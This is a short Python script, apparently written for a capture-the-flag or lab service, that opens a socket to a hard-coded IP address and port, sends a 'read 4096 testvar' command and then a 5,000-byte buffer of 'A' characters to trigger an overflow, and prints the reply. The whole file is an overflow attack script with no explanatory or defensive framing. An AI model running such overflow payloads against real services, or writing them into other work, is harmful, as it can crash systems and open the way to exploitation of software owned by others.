import socket
def send_overflow(ip, port):
  buffer= "A" * 5000
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.connect((ip, port))
      s.sendall(b"read 4096 testvar\n")
      s.recv(1024)
      s.sendall(buffer.encode('utf-8'))
      response= s.recv(1024)
      print("Received:", response.decode('utf-8'))
  except Exception as e:
      print("Error", e)
send_overflow('83.136.253.251', 38735) 